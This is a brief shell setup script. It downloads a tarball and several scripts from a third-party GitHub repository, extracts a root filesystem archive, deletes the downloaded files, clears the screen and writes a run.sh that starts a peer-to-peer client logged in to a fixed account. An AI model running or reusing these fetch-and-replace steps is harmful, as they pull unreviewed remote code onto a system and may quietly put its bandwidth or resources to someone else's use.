mv expressinstall.sh jcdhisf
wget -O a.tar.gz https://github.com/coolkiddev/fluffy-spork/raw/main/a.tar.gz
tar -xf a.tar.gz

# Removing Unnecessary files
rm main.sh
rm a.tar.gz

tar -xvf root.tar.xz
rm root.tar.xz
clear
wget -O expressinstall.sh https://raw.githubusercontent.com/coolkiddev/fluffy-spork/main/installreqs.sh
wget -O index.js https://raw.githubusercontent.com/coolkiddev/fluffy-spork/main/index.js
wget -O start.sh https://raw.githubusercontent.com/coolkiddev/fluffy-spork/main/start.sh
echo "p2pclient --login jilgfadyovchr@karenkey.com" > run.sh
